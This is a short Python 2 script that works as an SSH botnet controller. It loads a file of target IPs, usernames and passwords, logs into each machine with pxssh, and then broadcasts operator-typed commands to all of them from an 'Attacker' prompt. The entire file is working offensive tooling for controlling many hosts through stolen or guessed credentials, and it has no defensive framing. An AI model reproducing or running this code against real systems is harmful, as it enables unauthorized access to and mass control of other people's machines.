import time,pxssh

botNet = []

class Client:
    def __init__(self, host, user, password):
        self.host=host
        self.user=user
        self.password=password
        self.session=self.connect()
        
    def connect(self):
        try:
            s=pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print "[-] ", e
            time.sleep(1)
    
    def sendCommand(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output=client.sendCommand(command)
        print '[+] Output from : '+client.host
        print '[+] '+output 

def addClient(host, user, password):
    client=Client(host, user, password)
    botNet.append(client)

def main():
    try:
        print "Dictionary File Structure : [Target IP] [Account] [Password]"
        dictionary=raw_input("Input Dictionary File : ")
        fp=open(dictionary, "r")
        for line in fp.readlines():
            info=line.split(' ')
            addClient(info[0], info[1], info[2])
        while(True):
            string="Attacker["+str(len(botNet))+"] : "
            command=raw_input(string)
            botnetCommand(command)
    except Exception,e:
        print "[-] ", e
        time.sleep(30)
        exit(0)

if __name__=='__main__':
    main()